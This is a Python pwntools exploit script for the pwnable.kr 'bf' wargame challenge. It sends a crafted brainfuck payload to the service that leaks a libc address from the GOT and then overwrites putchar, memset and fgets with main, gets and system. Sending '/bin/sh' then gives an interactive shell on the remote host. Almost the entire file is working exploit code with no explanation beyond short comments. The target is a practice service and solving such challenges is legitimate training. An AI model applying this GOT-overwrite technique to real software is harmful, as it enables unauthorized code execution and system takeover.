from pwn import *

exe = ELF("bf")

#PUTS_OFFSET = 0x5fca0
#GETS_OFFSET = 0x5f3e0
#SYSTEM_OFFSET = 0x3ada0
PUTS_OFFSET = 0x5f020
GETS_OFFSET = 0x5e770
SYSTEM_OFFSET = 0x3a920
MAIN = 0x8048671

initial_p = 0x0804a0a0

payload = ""

def cmd_shift_p(num):
    global payload
    if num < 0:
        num = (-1) * num
        payload += ("<" * num)
    else:
        payload += (">" * num)

def cmd_print_p():
    global payload
    payload += "."

def cmd_print_addr():
    global payload
    for i in range(3):
        cmd_print_p()
        payload += ">"
    cmd_print_p()

def cmd_input_p():
    global payload
    payload += ","

def cmd_input_content(num):
    global payload
    for i in range(num-1):
        cmd_input_p()
        payload += ">"
    cmd_input_p()

def recv_addr(r):
    # 32-bit, each time print 1 char so loop 4 times 
    r.recv(1) # weird "\n"
    s = ""
    for i in range(4):
        c = r.recv(1)
        #print hex(ord(c))
        s += c
    return u32(s)

def input_content(r, addr_str):
    length = len(addr_str)
    # 32-bit, each time input 1 char so loop 4 times
    for i in range(length):
        r.send(addr_str[i])

def main():
    global payload
    r = remote('pwnable.kr', 9001)
    #r = process("./bf")

    # print menu
    print r.recvuntil("]")
    
    # find out got addrs
    GOT_PUTS = exe.got['puts']
    GOT_PUTCHAR = exe.got['putchar']
    GOT_FGETS = exe.got['fgets']
    GOT_MEMSET = exe.got['memset']
    print "got of puts(): " + str(hex(GOT_PUTS))
    print "got of putchar(): " + str(hex(GOT_PUTCHAR))
    print "got of fgets(): " + str(hex(GOT_FGETS))
    print "got of memset(): " + str(hex(GOT_MEMSET))
    num = GOT_PUTS - initial_p
    
    # cmd to shift p to got of puts()
    cmd_shift_p(num)
    # cmd to print addr
    cmd_print_addr()
    
    # cmd to shift p to got of putchar()
    num = GOT_PUTCHAR - GOT_PUTS - 3
    cmd_shift_p(num)
    # cmd to change got of putchar() to main
    cmd_input_content(4)

    # cmd to shift p to got of memset()
    num = GOT_MEMSET - GOT_PUTCHAR - 3
    cmd_shift_p(num)
    # cmd to change got of memset to gets(char *buf)
    cmd_input_content(4)

    # cmd to shift p to got of fgets()
    num = GOT_FGETS - GOT_MEMSET - 3 
    cmd_shift_p(num)
    # cmd to change got of fgets to system(char *buf)
    cmd_input_content(4)
 
    # now call putchar() to jump to main for the 2nd round
    cmd_print_p()
    
    # send payload
    r.sendline(payload)
    
    # recv addr
    puts = recv_addr(r)
    libc = puts - PUTS_OFFSET
    system = libc + SYSTEM_OFFSET
    gets = libc + GETS_OFFSET
    print "puts: " + str(hex(puts))
    print "system: " + str(hex(system))
    print "gets: " + str(hex(gets))

    # change got of putchar to main
    input_content(r, p32(MAIN))

    # change got of memset to gets()
    input_content(r, p32(gets))

    # change got of fgets to system()
    input_content(r, p32(system))

    # This is the 2nd round of main(), with memset = gets(buf) & fgets = system(buf)
    # print menu
    print r.recvuntil("]")
    
    # for memset = gets(buf), we input "/bin/sh" to <buf>
    r.sendline("/bin/sh")
    
    r.interactive()

### main ###
main()
